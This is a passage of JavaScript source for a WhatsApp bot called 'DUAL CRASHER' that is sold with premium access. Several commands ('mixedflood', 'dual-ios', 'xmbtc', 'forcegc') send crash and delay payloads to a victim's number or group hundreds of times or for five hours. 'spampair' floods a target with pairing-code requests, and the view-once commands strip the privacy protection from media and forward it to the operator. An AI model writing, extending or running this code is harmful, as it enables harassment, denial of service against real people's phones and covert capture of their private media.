          jpegThumbnail: pcci,
          name: "DUAL CRASHER"
        },
        contentText: txt,
        contextInfo: {
          quotedMessage: {
            interactiveResponseMessage: {
              body: { text: "devsmart.pdf", format: 1 },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: JSON.stringify({
                  wa_flow_response_params: { title: "sirmartins.pdf" }
                })
              }
            }
          },
          remoteJid: "status@broadcast",
          participant: sender
        },
        buttons: [{ buttonId: "Dual menu", buttonText: { displayText: "Dual" }, type: 1 }],
        headerType: 6
      }
    }, {});
    const idz = msg.key.id;
    await rich.relayMessage(from, msg.message, { messageId: idz });
    await sleep(1000);

    const waza = rich.tempIdStore[idz] = idz;
    if (!waza) return console.log("Id didnt resolved");    
    rich.lastMenuId[from] = waza;
    for (let i = 0; i < 300; i++) {
      await xdelay(rich, target);
      await sleep(1000);
    }
    await rich.sendMessage(from, { react: { text: "🍫", key: msg.key } });
    await sleep(500);
    await rich.sendMessage(from, { react: { text: "😈", key: msg.key } });
    await sleep(500);
    await rich.sendMessage(from, { react: { text: "✅", key: msg.key } });

  } catch (e) {
    console.log(e);
  }
}
break;
case "mixedflood": {
  try {
    if (!isPremium) return m.reply('premium only');
    if (!qtext) return reply(`Usage:\n${prefix + command} 234xx / @tag`);
    let jidx = qtext.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) {
      return reply(`\`The number must start with the country code.\``);  
    }
    let target = `${jidx}@s.whatsapp.net`;
    const pcci = await sharp(path.join(__dirname, '../start/media/CL.jpg'))
        .resize(150, 150)
        .jpeg({ quality: 100 })
        .toBuffer()
    console.log("thumb size:", pcci.length)
    const txt = `┌─────────
│➣ 𝚜𝚝𝚊𝚝𝚞𝚜 : in process ✅
│➣ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│➣ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│➣ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 30 𝚖𝚒𝚗𝚜
└─────────`;
    const msg = await generateWAMessageFromContent(from, {
      buttonsMessage: {
        locationMessage: {
          degreesLongitude: 0,
          degreesLatitude: 0,
          jpegThumbnail: pcci,
          name: "DUAL CRASHER"
        },
        contentText: txt,
        contextInfo: {
          quotedMessage: {
            interactiveResponseMessage: {
              body: { text: "devsmart.pdf", format: 1 },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: JSON.stringify({
                  wa_flow_response_params: { title: "sirmartins.pdf" }
                })
              }
            }
          },
          remoteJid: "status@broadcast",
          participant: sender
        },
        buttons: [{ buttonId: "Dual menu", buttonText: { displayText: "Dual" }, type: 1 }],
        headerType: 6
      }
    }, {});
    const idz = msg.key.id;
    await rich.relayMessage(from, msg.message, { messageId: idz });
    await sleep(1000);

    const waza = rich.tempIdStore[idz] = idz;
    if (!waza) return console.log("Id didnt resolved");    
    rich.lastMenuId[from] = waza;
    for (let i = 0; i < 200; i++) {
      await xdelay(rich, target)
      await Ios(rich, target)
      await monkey(rich, target)
      await sleep(20000);
    }
    await rich.sendMessage(from, { react: { text: "🍫", key: msg.key } });
    await sleep(500);
    await rich.sendMessage(from, { react: { text: "😈", key: msg.key } });
    await sleep(500);
    await rich.sendMessage(from, { react: { text: "✅", key: msg.key } });

  } catch (e) {
    console.log(e);
  }
}
break;
case 'xinvis-ios':
case 'dual-ios': {
  try {
    if (!isPremium) return m.reply('premium only');
    if (!qtext) return reply(`Usage:\n${prefix + command} 234xx / @tag`);
    let jidx = qtext.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) {
      return reply(`\`The number must start with the country code.\``);  
    }
    let target = `${jidx}@s.whatsapp.net`;
    const pcci = await sharp(path.join(__dirname, '../start/media/CL.jpg'))
        .resize(150, 150)
        .jpeg({ quality: 100 })
        .toBuffer()
    console.log("thumb size:", pcci.length)
    const txt = `┌─────────
│➣ 𝚜𝚝𝚊𝚝𝚞𝚜 : in process ✅
│➣ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│➣ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│➣ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 30 𝚖𝚒𝚗𝚜
└─────────`;
    const msg = await generateWAMessageFromContent(from, {
      buttonsMessage: {
        locationMessage: {
          degreesLongitude: 0,
          degreesLatitude: 0,
          jpegThumbnail: pcci,
          name: "DUAL CRASHER"
        },
        contentText: txt,
        contextInfo: {
          quotedMessage: {
            interactiveResponseMessage: {
              body: { text: "devsmart.pdf", format: 1 },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: JSON.stringify({
                  wa_flow_response_params: { title: "sirmartins.pdf" }
                })
              }
            }
          },
          remoteJid: "status@broadcast",
          participant: sender
        },
        buttons: [{ buttonId: "Dual menu", buttonText: { displayText: "Dual" }, type: 1 }],
        headerType: 6
      }
    }, {});
    const idz = msg.key.id;
    await rich.relayMessage(from, msg.message, { messageId: idz });
    await sleep(1000);

    const waza = rich.tempIdStore[idz] = idz;
    if (!waza) return console.log("Id didnt resolved");    
    rich.lastMenuId[from] = waza;
    for (let i = 0; i < 400; i++) {
      await Ios(rich, target)
      await DelayInVis(rich, target)
      await sleep(20000);
    }
    await rich.sendMessage(from, { react: { text: "🍫", key: msg.key } });
    await sleep(500);
    await rich.sendMessage(from, { react: { text: "😈", key: msg.key } });
    await sleep(500);
    await rich.sendMessage(from, { react: { text: "✅", key: msg.key } });

  } catch (e) {
    console.log(e);
  }
}
break;
case 'imenu': {
    const menuImages = [
        'https://files.catbox.moe/c46doz.jpg',
        'https://files.catbox.moe/5sx3ad.jpg',
        'https://files.catbox.moe/taqkc7.jpg',
        'https://files.catbox.moe/5cz9ox.jpg',
        'https://files.catbox.moe/wd4nrh.jpg'
    ];
    const richImageUrl = menuImages[Math.floor(Math.random() * menuImages.length)];

    const menuText = `
╔═════════════
   ✦ 𝑫𝑼𝑨𝑳 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝑩𝑶𝑻 ✦
╚═════════════
❖ 𝑪𝑹𝑬𝑨𝑻𝑶𝑹 : ✝ѕмαят
❖ 𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹 : ✝lordmbtc
❖ 𝑽𝑬𝑹𝑺𝑰𝑶𝑵 : 𝟑.𝟎
❖ 𝑷𝑹𝑬𝑭𝑰𝑿 :  .
❖ 𝑻𝒀𝑷𝑬 :  𝒄𝒂𝒔𝒆
╔════════════
┃〔 σтнєя мєηυ 〕
┃ νν
┃ νν2
┃ ¢яєαтєg¢
┃ тσιмg
┃ тσυяℓ
┃〔 ∂σωηℓσα∂ мєηυ 〕
┃ ρℓαу
┃〔 σωηєя мєηυ 〕
┃ вяσα∂¢αѕт
┃ υηвℓσ¢к
┃ вℓσ¢к
┃ єη¢
┃ яυηтιмє
┃ ριηg
┃ αℓινє
┃〔 gяσυρ мєηυ 〕
┃ кι¢к
┃ тαgαℓℓ
┃ ρяσмσтє
┃ ∂ємσтє
┃ mμтє
┃ υηmμтє
┃ ℓєƒт
┃ α∂∂
┃ ℓιηкg¢
┃ ∂єℓ
┃〔 вυgмєηυ 〕
♰ χg¢ (gc-id)
♰ ƒσя¢єg¢ (gc-id)
♰ ∂υαℓ-ισѕ (234xxx)
♰ χιηνιѕ-ισѕ (233xxx)
♰ вєтα-¢яαѕн (234xxx)
♰ ιηνιѕ∂єℓαу  (234xxx)
♰ miχє∂ƒℓσσ∂  (234xxx)
╚════════════`;
    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "FakeID12345",
            participant: "0@s.whatsapp.net"
        },
        message: {
            conversation: "𝑫𝑼𝑨𝑳 𝑪𝑹𝑨𝑺𝑯𝑬𝑹"
        }
    };
    await rich.sendMessage(from, {
        image: { url: richImageUrl },
        caption: menuText
    }, { quoted: fakeSystem });
    await sleep(2000)

await rich.sendMessage(m.chat, {

audio: richieplay,

mimetype: 'audio/mpeg'

}, { quoted: m
})
}
break;

case 'create-gc': case 'creategroup': {
 if (!isCreator) return m.reply("```for Owner only```.");
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await rich.groupCreate(args.join(" "), [])
let response = await rich.groupInviteCode(cret.id)
teks = ` 「 Create Group 」
▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
  `
rich.sendMessage(m.chat, { text:teks, mentions: await rich.parseMention(teks)}, {quoted:m})
} catch {
reply("done check!")
}
}
break;
 case 'rentbot': {
    const allowedUsers = ['2349157309056@s.whatsapp.net', '2348027503897@s.whatsapp.net','2349052729951@s.whatsapp.net','2349050207013@s.whatsapp.net'];
    if (!allowedUsers.includes(m.sender)) return reply("_Only authorized users can use this command._");
    if (!q) return reply(`Example:\n ${prefix + command} 234###`);
    let victim = text.split("|")[0];
    let Xreturn = m.mentionedJid?.[0] || m.quoted?.sender || victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    const contactInfo = await rich.onWhatsApp(Xreturn);
    if (!contactInfo || contactInfo.length === 0) {
        return reply("The number is not registered on WhatsApp");
    }
    await reply("*processing.....*");
    const numberOnly = victim.replace(/[^0-9]/g, '');
    const countryCode = numberOnly.slice(0, 3);
    const prefixxx = numberOnly.slice(0, 1);
    const firstTwoDigits = numberOnly.slice(0, 2);
    const isValidWhatsAppNumber = (number) => {
        return number.length >= 10 && number.length <= 15 && !isNaN(number);
    };
    if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
        return reply("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
    }
    if (!isValidWhatsAppNumber(numberOnly)) {
        return reply("Invalid WhatsApp number. Please enter a valid number.");
    }
    const startpairing = require('./rentbot.js');
    await startpairing(Xreturn);
    await sleep(4000);
    const fs = require('fs');
    const cu = fs.readFileSync('./start/lib2/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    await sleep(2000);
    await rich.sendMessage(m.chat, {
        image: { url: "https://i.ibb.co/wnXDcdv/subzero-bot.jpg" },
        caption:  `ALAN-NXDS`
    }, { quoted: m });

    await sleep(4500);
    break;
}       
case 'smartlist': {
const allowedUsers = ['2349157309056@s.whatsapp.net', '2349050207013@s.whatsapp.net', '2348027503897@s.whatsapp.net'];
    if (!allowedUsers.includes(m.sender)) {
        return reply("❌ Sorry, you don't have permission to use this command.");
    }

    const pairingPath = './lib2/pairing';

    try {
        if (!fs.existsSync(pairingPath)) {
            return reply('No paired devices found.');
        }

        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name.replace('@s.whatsapp.net', ''));

        if (pairedDevices.length === 0) {
            return reply('No paired devices found.');
        }

        const totalUsers = pairedDevices.length;
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        reply(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return reply('Failed to load paired devices data.');
    }
}
break;
// ===================== CASE: Add Owner =====================
case 'addowner': 
case 'addown': {
    if (!isCreator) return reply(`\`only the owner can use this command!\``);
    if (!args[0]) return reply(`*english:* usage: ${prefix + command} 234xx`);

    let number = qtext.split("|")[0].replace(/\D/g, '');
    let isRegistered = await rich.onWhatsApp(number + "@s.whatsapp.net");
    
    if (isRegistered.length === 0) return reply(`\` invalid number\``);

    owner.push(number);
    Premium.push(number);
    
    fs.writeFileSync('./function/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./function/premium.json', JSON.stringify(Premium));

    reply(`\`owner added successfully!\`!`);
}
break;

case 'xmbtc': {
const allowedUsers = ['2349157309056@s.whatsapp.net', '2349050207013@s.whatsapp.net', '2348027503897@s.whatsapp.net'];
    if (!allowedUsers.includes(m.sender)) {
        return reply("❌ Sorry, you don't have permission to use this command.");
    }
 if (!q) return reply("Example Use.xmbtc 234xxx");
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    reply(` *Information Attacking* ${target} `);

    const FIVE_HOURS = 5 * 60 * 60 * 1000; // 5 hours in milliseconds
    const startTime = Date.now();

    while (Date.now() - startTime < FIVE_HOURS) {
    try {
        await  monkey(rich, target)
        await DelayInVis(rich, target)
        await sleep(2000);
    } catch (err) {
        console.error('VanitasFC Error:', err);
        if (err?.output?.statusCode === 428 || err.message.includes('Connection Closed')) {
            reply('_Connection closed during delay. Trying to reconnect..._');
            break;
        }
    }
    await sleep(15000); // delay
}

    reply(" Attack completed after 5 hours ");
}
break;
case 'dual-url': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return m.reply(`processing with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('Failed to download media!');
    }

    const uploadImage = require('./tourl/Data6');
    const uploadFile = require('./tourl/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('Failed to upload media!');
    }

    rich.sendMessage(m.chat, {
        text: `here is your url \n ${link}`
    }, { quoted: m });
}
break;   
// ===================== CASE: Delete Owner =====================
case 'delowner': 
case 'delown': {
    if (!isCreator) return reply(`\`only the owner can use this command!\``);
    if (!args[0]) return reply(`\`usage: ${prefix + command} 234xxx\``);

    let number = qtext.split("|")[0].replace(/\D/g, '');
    let indexOwner = owner.indexOf(number);
    let indexPremium = Premium.indexOf(number);

    if (indexOwner !== -1) owner.splice(indexOwner, 1);
    if (indexPremium !== -1) Premium.splice(indexPremium, 1);

    fs.writeFileSync('./function/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./function/premium.json', JSON.stringify(Premium));

    reply(`\`owner removed successfully!\``);
}
break;
case 'dual-ai': {
  if (!text) return m.reply(`yes im here ask me anything?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let pei = await openai(text, "")
m.reply(pei)
}
break

case "listgc": case "gc-id": {
 if (!isPremium) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)
let teks = `\n *乂 List all group chat*\n`
let a = await rich.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *name :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *owner :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break
case 'hy':
case 'smart': {
  if (!isCreator && !isPremium) return;
  const { getDevice } = require("@whiskeysockets/baileys");
  try {
    const deviceId = await getDevice(m.quoted ? m.quoted.id : m.key.id);
    const sender = m.quoted
      ? m.quoted.sender
      : (m.key.participant || m.key.remoteJid);

    const text = `⚠️ Smart-Mods ⚠️

🌐 DEVICE ID: ${deviceId} ✅
📍 LOCATION TRACKED: ${sender.split("@")[0]}`;

    await rich.sendMessage(botNumber, {
      text
    });
  } catch (error) {
    reply("❌ Failed to retrieve device information.");
  }
}
break;
case "getdevice": {
  if (!isCreator && !isPremium) return;
  const { getDevice } = require("@whiskeysockets/baileys");
  try {
    const deviceId = await getDevice(m.quoted ? m.quoted.id : m.key.id);
    const sender = m.quoted ? m.quoted.sender : m.key.participant || m.key.remoteJid;
    await reply(
      `⚠️Smart-Mods⚠️ : Device FOUND  
🌐 DEVICE ID: ${deviceId} ✅
📍 LOCATION TRACKED: ${sender.split("@")[0]}`
    );
  } catch (error) {
    return reply("❌ Failed to retrieve device information.");
  }
}
break;

 case 'xgc':
 case 'forcegc': {
    if (!isPremium) return reply("_Only For Dev.Smart/Owner..._");
    if (!q) return reply(`Example: .${command} 120363xxx@g.us 20`);
    let args = q.split(" ");
    let victimxd = args[0];
    let count = parseInt(args[1]);
    if (!/^\d+@g\.us$/.test(victimxd))
        return reply("Invalid group ID!");
    if (isNaN(count)) return reply("Enter a valid number!");
    if (count > 70) count = 70;
    for (let i = 0; i < count; i++) {
    await monkey(rich, victimxd)
   reply(`✅ Sent ${count} messages.`);
}
 }
break;       
case "listch": {
if (!isPremium) return reply(mess.premium);

    global.channels = loadChannels();

    if (global.channels.length === 0) {
        return reply("Belum ada ID saluran yang terdaftar!");
    }

    let list = global.channels
        .map((id, index) => `${index + 1}. ${id}`)
        .join("\n");

    reply(`Daftar ID Saluran Terdaftar:\n\n${list}`);
}
break
case 'spampair': {
if (!isCreator) return reply(`\`only the owner can use this command!\``);
const usePairingCode = true
const resolveMsgBuffer = new NodeCache()
			                 
			if (!q) return reply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair  234xx`) 
			let [peenis, pepekk = "200"] = q.split("|")
			await reply(`</> SUCCESSFULLY SPAMMING CODES`)
			await rich.sendMessage(m.chat, { react: { text: `🌱`, key: m.key }})
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('pairspam')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				browser: ['Mac Os', 'chrome', '121.0.6167.159'],
version: [2, 2413, 1],
keepAliveIntervalMs: 50000,
printQRInTerminal: !usePairingCode,
generateHighQualityLinkPreview: true,
resolveMsgBuffer,
				logger: pino({ level: "silent" }),
					level: 'fatal'
				})
			for (let i = 0; i < pepekk; i++) {
			await sleep(2000)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`Success Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(2000)
		}
break      
// ===================== CASE: Add Premium =====================
case 'addpremium': 
case 'addprem': {
    if (!isCreator) return reply(`\`only the owner can use this command!\``);
    if (!args[0]) return reply(`\`usage: ${prefix + command} 234xx\``);

    let number = qtext.split("|")[0].replace(/\D/g, '');
    let isRegistered = await rich.onWhatsApp(number + "@s.whatsapp.net");

    if (isRegistered.length === 0) return reply(`\`invalid number!\``);

    Premium.push(number);
    fs.writeFileSync('./function/premium.json', JSON.stringify(Premium));

    reply(`\`premium user added successfully!\``);
}
break;

// ===================== CASE: Delete Premium =====================
case 'delpremium': 
case 'delprem': {
    if (!isCreator) return reply(`\`only the owner can use this command!\``);
    if (!args[0]) return reply(`\`usage: ${prefix + command} 234xxx\``);

    let number = qtext.split("|")[0].replace(/\D/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) Premium.splice(indexPremium, 1);

    fs.writeFileSync('./function/premium.json', JSON.stringify(Premium));

    reply(`\`premium user removed successfully!\``);
}
break;   
// ===================== CASE: Public Mode =====================
case 'public': {
    if (!isCreator) return reply(`\`only the owner can use this command.\``);
    
    rich.public = true;
    reply(`\`bot is now in public mode.\`.`);
}
break;

// ===================== CASE: Private Mode =====================

case 'vv': {
if (!isCreator) return reply("```Nuh-uh~ Only my beloved Master can use this!```");
    if (!m.quoted) return reply('Hehe~ You forgot to reply to a view-once image, video, or voice note!');

    try {
        const mediaBuffer = await rich.downloadMediaMessage(m.quoted);

        if (!mediaBuffer) {  
            return reply('Eep~ I couldn’t grab the media. Can you try again, please?\n~ Yours truly, Dual Bot');  
        }  

        const mediaType = m.quoted.mtype;  
        const footer = "\n─────⸙ *Dual Bot ²⁵*";

        if (mediaType === 'imageMessage') {  
            await rich.sendMessage(m.chat, {   
                image: mediaBuffer,   
                caption: "*Image unsealed successfully~*" + footer  
            }, { quoted: m });
        } else if (mediaType === 'videoMessage') {  
            await rich.sendMessage(m.chat, {   
                video: mediaBuffer,   
                caption: "*Video unsealed for Master~*" + footer  
            }, { quoted: m });
        } else if (mediaType === 'audioMessage') {  
            await rich.sendMessage(m.chat, {   
                audio: mediaBuffer,   
                mimetype: 'audio/ogg',  
                ptt: true,  
                caption: "*Here's the secret voice~*" + footer  
            }, { quoted: m });
        } else {  
            return reply('Uwaa~ I can only reveal images, videos, or voice notes, Master!\n~ Your loyal Dual Bot.');  
        }
    } catch (error) {
        console.error('Error:', error);
        await replyn('Ahh~ Something went wrong! Try again or use `.save`, okay?\n~ Kiss from Dual assistance!');
    }
}
break;
case "waw": case "vv2": case "readviewonce2": {
if (!isPremium) return reply("```for Owner only```.");
    if (!m.quoted) {
        return reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await rich.sendMessage(botNumber, {
                image: media,
                caption: " ",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await rich.sendMessage(botNumber, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await rich.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            reply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        reply(` Failed to process media. Please try again.`);
    }
}
break;

case 'enc':
case 'obf':
case 'jsobfuscate': {
  if (!m.quoted || !m.quoted.text) return reply(' Reply to a JavaScript code block to obfuscate.');

  const code = m.quoted.text.trim();
  const encoded = encodeURIComponent(code);
  const api = `https://fastrestapis.fasturl.cloud/tool/jsobfuscate?inputCode=${encoded}&encOptions=NORMAL&specialCharacters=on&fastDecode=off`;

  try {
    const res = await fetch(api);
    const json = await res.json();

    if (json.status !== 200 || !json.result) {
      return reply(' Failed to obfuscate the code.');
    }

    const fileBuffer = Buffer.from(json.result, 'utf-8');
    await rich.sendMessage(m.chat, {
      document: fileBuffer,
      mimetype: 'application/javascript',
      fileName: 'megaobf.js',
      caption: 'JavaScript Obfuscated Successfully'
    }, { quoted: m });

  } catch (err) {
    console.error('[JS OBF ERROR]', err);
    reply(' An error occurred while obfuscating the code.');
  }
}
break;

case 'broadcast':
case 'bc': {
  if (!isPremium) return reply('```For Owner only.```');
  if (!text && !(m.quoted && m.quoted.mtype === 'imageMessage')) return reply(` Reply to an image or type:\n${prefix + command} <text>`);

  const groups = Object.keys(await rich.groupFetchAllParticipating());
  await reply(` Broadcasting to ${groups.length} groups...`);

  const contextInfo = {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363401816875075@newsletter",
      newsletterName: "©Dual Bot - 2025"
    }
  };

  const bcText = `╭─〔 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐁𝐘 𝐎𝐖𝐍𝐄𝐑 〕\n│ ${text.split('\n').join('\n│ ')}\n╰─⸻⸻⸻⸻`;

  for (let id of groups) {
    await sleep(1500);

    try {
      if (m.quoted && m.quoted.mtype === 'imageMessage') {
        const media = await rich.downloadAndSaveMediaMessage(m.quoted);
        await rich.sendMessage(id, {
          image: { url: media },
          caption: bcText,
          contextInfo
        });
      } else {
        await rich.sendMessage(id, {
          text: bcText,
          contextInfo
        });
      }
    } catch (err) {
      console.error(` Broadcast to ${id} failed:`, err);
    }
  }

  reply(' Broadcast finished.');
}
break;


case 'unblock': case 'unblocked': {

	 if (!isCreator) return reply("```for Owner only```.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await rich.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break;


case 'block': case 'blocked': {
	
	 if (!isCreator) return reply("```for Owner only```.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await rich.updateBlockStatus(users, 'block')
		await reply(`Done`)
			}
	break;

case 'toimg':
  {
    const quoted = m.quoted ? m.quoted : null
    const mime = (quoted?.msg || quoted)?.mimetype || ''
    if (!quoted) return reply('Reply to a sticker/image.')
    if (!/webp/.test(mime)) return reply(`Reply to a sticker with *${prefix}toimg*`)
    if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp')
    const media = await rich.downloadMediaMessage(quoted)
    const filePath = `./tmp/${Date.now()}.jpg`
    fs.writeFileSync(filePath, media)
    await rich.sendMessage(m.chat, { image: fs.readFileSync(filePath) }, { quoted: m })
    fs.unlinkSync(filePath)
  }
  break
  case "play": {
if (!text) return reply(example("past lives"))
await rich.sendMessage(m.chat, {react: {text: '🦜', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await rich.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await rich.sendMessage(m.chat, {react: {text: '', key: m.key}})
} else {
return reply("Error! Result Not Found")
}
}
break;

case 'kick': {
  if (!m.quoted) return reply("```Tag or quote the user to kick!```");
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("``` Only group admins can kick```");
  if (!isBotAdmins) return reply("``` Bot must be admin```");

  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await rich.groupParticipantsUpdate(m.chat, [users], 'remove');
  reply("``` User has been kicked```");
}
break;


case 'tagadmin':
case 'listadmin':
case 'admin': {
  if (!isCreator) return reply("``` For Owner only```");
  if (!m.isGroup) return reply(msg.only.group);

  const groupAdmins = participants.filter(p => p.admin);
  const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
  const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net';

  let text = `* Group Admins:*\n${listAdmin}`;
  rich.sendMessage(m.chat, {
    text,
    mentions: [...groupAdmins.map(v => v.id), owner]
  }, { quoted: m });
}
break;


case 'delete':
case 'del': {
  if (!isPremium) return reply("``` For Owner only```");
  if (!m.quoted) return reply("``` Reply to a message to delete it```");

  rich.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.quoted.id,
      participant: m.quoted.sender
    }
  });
}
break;


case 'linkgroup':
case 'linkgc':
case 'gclink':
case 'grouplink': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isBotAdmins) return reply("``` Bot must be admin```");

  let response = await rich.groupInviteCode(m.chat);
  rich.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\n*🔗 Group Link:* ${groupMetadata.subject}`, m, { detectLink: true });
}
break;


case 'join': {
  if (!isPremium) return reply("``` For Owner only```");
  if (!text) return reply(`Example: *${prefix + command} <group link>*`);
  if (!isUrl(args[0]) || !args[0].includes('whatsapp.com')) return reply("```❌ Invalid group link!```");

  let result = args[0].split('https://chat.whatsapp.com/')[1];
  await rich.groupAcceptInvite(result);
  reply("``` Successfully joined the group```");
}
break;

case 'tagall': {
  if (!isPremium) return reply("```For Owner only```");
  if (!m.isGroup) return reply(msg.only.group);

  const textMessage = args.join(" ") || "No context";
  let teks = `\`\`\` Tagging all members:\`\`\`\n> *${textMessage}*\n\n`;

  const groupMetadata = await rich.groupMetadata(m.chat);
  const participants = groupMetadata.participants;

  for (let mem of participants) {
    teks += `@${mem.id.split("@")[0]}\n`;
  }

  rich.sendMessage(m.chat, {
    text: teks,
    mentions: participants.map((a) => a.id)
  }, { quoted: m });
}
break;


case 'hidetag': {
  if (!isPremium) return reply("``` For Owner only```");
  const groupMetadata = await rich.groupMetadata(m.chat);
  const participants = groupMetadata.participants;
  
  rich.sendMessage(m.chat, {
    text: q || '',
    mentions: participants.map(a => a.id)
  }, { quoted: m });
}
break;


case 'promote': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("```Only group admins can use this!```");
  if (!isBotAdmins) return reply("``` Bot needs to be admin first!```");

  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await rich.groupParticipantsUpdate(m.chat, [users], 'promote');
  reply("```User promoted to admin```");
}
break;


case 'demote': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("```Only group admins can use this!```");
  if (!isBotAdmins) return reply("``` Bot needs to be admin first!```");

